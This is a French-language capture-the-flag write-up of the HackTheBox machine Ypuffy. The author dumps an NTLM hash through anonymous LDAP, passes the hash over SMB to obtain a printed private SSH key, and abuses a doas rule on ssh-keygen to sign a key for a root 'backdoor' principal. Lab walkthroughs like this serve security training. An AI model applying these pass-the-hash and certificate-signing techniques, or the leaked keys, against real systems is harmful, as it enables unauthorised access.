# Solution du CTF Ypuffy de HackTheBox

Introduction
------------

*Other*... telle était la description pour l'OS faisant tourner la machine *Ypuffy* de *HackTheBox*... Autant dire qu'il ne m'en fallait pas plus pour attiser ma curiosité.  

Les noms des machines donnent généralement un indice sur ce à quoi l'on va avoir affaire... So what ? YP (*Yellow Pages* aka [NIS](https://en.wikipedia.org/wiki/Network_Information_Service)) pour retourner à l'époque de mes études où un bon *ypcat* permettait d'obtenir les hashs de l'IUT avant de les relayer à ce bon *John The Ripper* ? :D  

Et bien, pas si sûr !  

Poisson à piques
----------------

On découvre rapidement la nature de l'OS avec un scan Nmap :  

```plain
Nmap scan report for ypuffy.hackthebox.htb (10.10.10.107)
Host is up (0.030s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.7
| ssh-hostkey:
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
| ssh2-enum-algos:
|   kex_algorithms: (10)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
80/tcp  open  http        OpenBSD httpd
|_http-comments-displayer: Couldn't find any comments.
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers:
|_http-traceroute: ERROR: Script execution failed (use -d to debug)
| http-useragent-tester:
|   Allowed User Agents:
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
389/tcp open  ldap        (Anonymous bind OK)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       supportedLDAPVersion: 3
|       namingContexts: dc=hackthebox,dc=htb
|       supportedExtension: 1.3.6.1.4.1.1466.20037
|_      subschemaSubentry: cn=schema
| ldap-search:
|   Context: dc=hackthebox,dc=htb
|     dn: dc=hackthebox,dc=htb
|         dc: hackthebox
|         objectClass: top
|         objectClass: domain
|     dn: ou=passwd,dc=hackthebox,dc=htb
|         ou: passwd
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
|         uid: bob8791
|         cn: Bob
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         userPassword: {BSDAUTH}bob8791
|         uidNumber: 5001
|         gidNumber: 5001
|         gecos: Bob
|         homeDirectory: /home/bob8791
|         loginShell: /bin/ksh
|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
|         uid: alice1978
|         cn: Alice
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: sambaSamAccount
|         userPassword: {BSDAUTH}alice1978
|         uidNumber: 5000
|         gidNumber: 5000
|         gecos: Alice
|         homeDirectory: /home/alice1978
|         loginShell: /bin/ksh
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
|         displayName: Alice
|         sambaAcctFlags: [U          ]
|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
|         sambaPwdLastSet: 1532916644
|     dn: ou=group,dc=hackthebox,dc=htb
|         ou: group
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: bob8791
|         userPassword: {crypt}*
|         gidNumber: 5001
|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: alice1978
|         userPassword: {crypt}*
|         gidNumber: 5000
|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
|         sambaDomainName: YPUFFY
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
|         sambaAlgorithmicRidBase: 1000
|         objectclass: sambaDomain
|         sambaNextUserRid: 1000
|         sambaMinPwdLength: 5
|         sambaPwdHistoryLength: 0
|         sambaLogonToChgPwd: 0
|         sambaMaxPwdAge: -1
|         sambaMinPwdAge: 0
|         sambaLockoutDuration: 30
|         sambaLockoutObservationWindow: 30
|         sambaLockoutThreshold: 0
|         sambaForceLogoff: -1
|         sambaRefuseMachinePwdChange: 0
|_        sambaNextRid: 1001
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: Host: YPUFFY
```

Ça fait déjà beaucoup d'infos à digérer. On a donc un *OpenBSD* avec un *openldap* ainsi qu'un *samba*. L'accès anonyme à LDAP a permis à Nmap de nous sortir deux noms d'utilisateurs.  

Ajouté à cela il semble que l'on ait carrément le hash NTLM de l'utilisatrice *alice1978* !  

Pour ce qui est du serveur web, ce dernier ne nous retourne rien. Difficile de dire si c'est parce que d'autres participants bourinent le service ou non

Passe passe le hash, il y a du monde sur le câble RJ45
------------------------------------------------------

Depuis Kali on peut avoir recours aux versions *pth* de Samba pour se connecter via ce hash :  

```plain
$ pth-smbclient --pw-nt-hash -U alice1978 -I 10.10.10.107 -L YPUFFY //YPUFFY/ 0B186E661BBDBDCF6047784DE8B9FD8B
WARNING: The "syslog" option is deprecated

    Sharename       Type      Comment
    ---------       ----      -------
    alice           Disk      Alice's Windows Directory
    IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------

$ pth-smbclient --pw-nt-hash -U alice1978 -I 10.10.10.107 //YPUFFY/alice 0B186E661BBDBDCF6047784DE8B9FD8B
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 17 13:30:49 2018
  ..                                  D        0  Mon Sep 17 14:02:24 2018
  my_private_key.ppk                  A        0  Tue Jul 17 03:38:51 2018

        433262 blocks of size 1024. 411462 blocks available
```

Ce fichier PPK une fois récupéré s'avère être une clé SSH au format Putty :  

```plain
PuTTY-User-Key-File-2: ssh-rsa
Encryption: none
Comment: rsa-key-20180716
Public-Lines: 6
AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz
1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02qux
BoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAj
h7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/Sxa
iA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWx
ivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw==
Private-Lines: 14
AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwF
VGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSE
cOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsma
hRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1q
Gs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC
3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6
m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6
l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v
4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+
qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPh
hKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAA
AIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5c
QLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+Wuvl
xTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9
```

La conversion vers une clé SSH dans le format classique se fait via l'utilitaire [puttygen](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) qui fonctionne très bien sous Wine.  

On obtient alors la clé privée suivante :  

```plain
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR
+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A
0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIsk
Hqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMs
qpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1
adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/UfwIBJQKCAQB9JJx9saa5LsnB6Idf
LBq5b1RlRugtr2fT7IgXT/+cJoaWCN0r5592S/AsBVRml3YnYWbpwvcZg9f0AIAo
E8/xYecpfpxnXgVnNdISw9knqhSaB1Oki2KTklYkhHDmeZmEsuCCEYD3SSsC+jT5
6zvqjkUkrPbilahHZii5uZWrfXUSVbRZRtrWe7bJmoUTP//XbuTCllnpiZVvT5kR
mOrIQEzNzsPC6IzYJ6aBzYoAem/5HQ6M8ekSH/G9ahrPoGlNVuRVXoYlenTtjox1
KFLQTBNNaMAS78I3Vf9Unmv5HGWu9k2CDKDdTFBBQt4ZQVXFm4svjtuyc5g84WHp
9CatAoGBANTBwU1DttMKKphHAN23+tvIAh3rlNG6m+xeStOxEusrbNL89aEU03FW
XIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6l4UVEuHUqnTfEOowVTcVNlwp
NM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v4L9aKFwiMZxfAoGBAMb6j3Gu
H6tm5CDwFnplwYZ2zNkhOfv3trhhT43PGM/iNH6pJUJNGTL25I/SL0fsH0pWe670
B/MoMGBIf/PEWcmoFNPKQzWKaO37LXBVr/dos+GErF4+Uis/dhowp3fyyzZ5t6pb
L5cljCBY6xLDzABBPt8jGZPw5h8lGNEZNLvhAoGAUICqAY8+QgPYw/8wwpikG88j
ZURh0tD8uk0xEdRMWPusotxBQ95d19t89fz+qZO3TER90c4paPkuAgWfLCkIX8GO
qvM9jXp+hWHreAtHan3quXoSZ96DRXdgFwI69GIms9QKDdy9NmimGQwQIsC0Wggf
jkS3cGwP2bNpN548SQECgYEAvDkf6BNqENbzeRp2IMEe2SRFPBiC9URFD0dLQPRV
vbpNVTg4AHJxyG0BuHq3GoVptQWzRKGmp747mVlWcPgB6EUMyFeLry/mt5qSxDVh
Q/tCX7TaZvyul5zlVwtt+9fU/C3y7UGAC4Rh9RXXcp2Jn2BQOtwDcES+AcklUCyZ
qs0CgYEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2
iI5cQLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+
WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
-----END RSA PRIVATE KEY-----
```

```plain
$ ssh -i private_key alice1978@10.10.10.107
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$ id
uid=5000(alice1978) gid=5000(alice1978) groups=5000(alice1978)
ypuffy$ pwd
/home/alice1978
ypuffy$ cat user.txt                                                                                                                                                                          
acbc06eb2982b14c2756b6c6e3767aab
```

On ne voit pas d'utilisateur *bob* dans le fichier *passwd* mais la ligne commençant par un + en fin de fichier est typique de NIS.  

```plain
+:*:0:0:::
userca:*:1001:1001:User CA:/home/userca:/bin/ksh
```

Concernant l'utilisateur *userca*, il possède différents fichiers sur le système :  

```plain
ypuffy$ find / -user userca 2> /dev/null
/home/userca
/home/userca/.ssh
/home/userca/.Xdefaults
/home/userca/.cshrc
/home/userca/.cvsrc
/home/userca/.login
/home/userca/.mailrc
/home/userca/.profile
/home/userca/ca
/home/userca/ca.pub
/var/www/userca
/var/www/userca/ca.pub
```

*ca.pub* est bien sûr une clé publique. Son penchant privé n'est malheureusement pas accessible :|  

Même si l'utilisateur *bob8791* n'apparaît pas dans le */etc/passwd* il dispose bien d'un dossier sous */home* avec un fichier SQL lisible :  

```text
CREATE TABLE principals (
        uid text,
        client cidr,
        principal text,
        PRIMARY KEY (uid,client,principal)
);

CREATE TABLE keys (
        uid text,
        key text,
        PRIMARY KEY (uid,key)
);
grant select on principals,keys to appsrv;
```

Dans le fichier */var/www/logs/access.log* on peut lire les 4 premières lignes suivantes :  

```plain
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:36:34 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:36:34 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:37:37 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:37:37 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
```

Cela m'a incité à jeter un œil au serveur web qui nous était inaccessible depuis l'extérieur. Malheureusement on ne peut pas forwarder le port via SSH (cela nous est refusé). Il faudra donc passer par un simple cURL.  

Si la requête ne retourne rien pour *root*, *bob8791* et *userca* on obtient en revanche une clé publique pour Alice :  

```plain
ypuffy$ curl -D- "http://127.0.0.1/sshauth?type=keys&username=alice1978"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Date: Sat, 15 Sep 2018 08:09:05 GMT
Server: OpenBSD httpd
Transfer-Encoding: chunked

ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
```

L'emplacement des sources de l'application web est facile à trouver vu que le path */var/appsrv/sshauthd* est mentionné dans le listing des process (en argument de uwsgi) mais l'accès au fichier est interdit :|  

Vu que le fichier SQL mentionnait une table *principals* en plus de la table *keys*, autant essayer de changer la valeur de la clé *type* :  

```plain
ypuffy$ curl -D- "http://127.0.0.1/sshauth?type=principals&username=root"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Date: Sun, 16 Sep 2018 08:04:46 GMT
Server: OpenBSD httpd
Transfer-Encoding: chunked

3m3rgencyB4ckd00r
```

On obtient un résultat surprenant avec l'utilisateur root alors que les pour les autres utilisateurs ça ne retourne que leur login ou rien du tout pour *userca*...  

Une petite signature s'il vous plait
------------------------------------

Après quelques errances sans rien trouver je me suis retranché sur un bon vieux grep pour *userca* dans /etc et ça a payé :)  

D'abord dans */etc/ssh/sshd\_config* :

```plain
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
AuthorizedPrincipalsCommandUser nobody
```

et aussi dans le fichier */etc/doas.conf* :  

```plain
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
```

Comme vous l'aurez deviné, *doas* semble être l'équivalent OpenBSD de *sudo* :)  

Récapitulons : D'abord il existe un utilisateur *userca* dont le nom laisse penser à une autorité de certification (CA) donc la possibilité de signer des clés et/ou des certificats. Ensuite on peut grâce à la règle *doas* utiliser la commande *ssh-keygen* comme si on était *userca*.  

Le premier réflexe (et en partie le bon) est de se jeter sur [la page de manuel de ssh-keygen](https://man.openbsd.org/ssh-keygen) pour déterminer si on peut dumper d'une manière ou d'une autre la clé privée */home/userca/ca*... et force est de constater qu'on ne peut pas :'(  

Il semble qu'au mieux on puisse obtenir son hash SHA256. Le brute-force est laissé en exercice au lecteur :D  

```plain
ypuffy$ doas -u userca /usr/bin/ssh-keygen -l
Enter file in which the key is (/home/userca/.ssh/id_rsa): /home/userca/ca
2048 SHA256:WCPFBuZqiubacS+hgAGylLHBjatuKa8zoWO2vFFycsg userca@ypuffy.hackthebox.htb (RSA)
```

Il est maintenant temps d'essayer de signer notre clé publique avec la clé privée de *userca* pour voir si cela nous ouvre des portes.  

Il faut préalablement copier notre clé publique sur le système (*devloop.pub*) et spécifier un *principal* valide :  

```plain
ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I user_bob8791 -n bob8791 devloop.pub                                                                                          
Signed user key devloop-cert.pub: id "user_bob8791" serial 0 for bob8791 valid forever
ypuffy$ ls
devloop-cert.pub devloop.pub
ypuffy$ cat devloop-cert.pub
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAg2CBENUwRd4EDBXHlOyuZPpAGhx+lf/AcTbpv5PnhqhkAAAADAQABAAABAQCv8FS/dSzzjIBMQjk9LxpvqNUdQzEgTi7v9aL5KkY0Jfh4GbWcWyNix8WPP6RbW9INYgV9E+wiagk0sNHSXCXDQGR43nO5tV/zEZmU8BGN66r71HnBaS1TnGzXsTzDg1QSRtst2WeYNf10D/MYN5O59mgzpVi+OJi1cKn5xHpDOn1vsb2c0D88J5V46WRfYIHgw90/Ddm35Ol/rzBpAEJY46AW5TYooT/zBPxNxsl216ZY1u03QInDT+eyfCxsDUWfMOlFlu+grizNj8mbv9a1+cUimxkKOUD9RVqQl4YJLJDwlvGEwMzjDwZVNy1cq+bahquCmK1ZkqYo5QqQQ7vXAAAAAAAAAAAAAAABAAAADHVzZXJfYm9iODc5MQAAAAsAAAAHYm9iODc5MQAAAAAAAAAA//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEA3WBlme+5KrrogdFtpj6LtTCUGial+xBMzRyRkJxqm3O2iTCQbXZXgxbeCR1c4jgCrU+jFFef1E0ipaC8ONE/M9RGgJt4pV6AU0EbvbQt3UpCTFdQePwDfOt/ChMhZDhr2eoRVC5HIfTt72bBR/BmP8X/AmTT/IUw/z9xGWl3whGnmwIDW/ZpT8QNRH48UxIgMUCSMGJFHLKBAyvyMiVgV3fTISJvHoyyriqK/X4oRzIsJzU8LJMHJJ7eCWf7aJtwm8ZldMBfp27iIllnuRxY3jWsSoHwt0TcnFXrtMp1Gd0Bj0xiC6D0PI3EKA+aVMilUTL6d98bW6vAmMCIv5VfmwAAAQ8AAAAHc3NoLXJzYQAAAQAhxeW62NdJ9hnglumrh71Lzws0G0v2SJuY2DoiC5jZoao2DbUBCq2pVU3xmgzoX8c/kcyj9L40AwzrOBuhuWRE/cGou9DlGSdETbtmdeXZsBHOYiTnM7EbMXEcU6EYW14GSu7mM2/MhJpnRPva1ki/MQFHlZn4NU1yTFcHf3B43S10TrjRrYEpXfth1ORXhO6wepbE9gY7UetrPHgTkFa5gFKB/HRBUbjQLKW8Sgr1DM56ElFmljktJB02Qbb5r2khQw/POEms7Rf0+JUIL+DE8kW4gaARoIDbN4yr3m66j01Yi8NfSGv/hq0lNsp9FQ8TDspM+64+N1BRJIE2+Yj9 devloop.pub
```

Une fois ce fichier *devloop-cert.pub* généré on le rapatrie sur notre système et on le place à l'emplacement *~/.ssh/id\_rsa-cert.pub* pour que le client SSH le trouve.  

On peut alors se connecter en tant que *bob8791* sur le système. Il en va exactement de même avec l'utilisateur root sauf que le principal est *3m3rgencyB4ckd00r*.  

```plain
$ ssh root@10.10.10.107
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy# id                                                                                                                                                                                    
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
ypuffy# cat root.txt                                                                                                                                                                          
1265f8e0a1984edd9dc1b6c3fcd1757f
```

Conclusion
----------

Au final pas de *NIS*, ni de *Yellow Pages* si ce n'est le process *ypldap* qui tournait...  

Ça m'aura tout de même permis de découvrir des fonctionnalités avancées d'OpenSSH :)  

Pour ce qui est de l'utilisateur *bob8791* je cherche encore son utilité :p

*Published February 09 2019 at 17:05*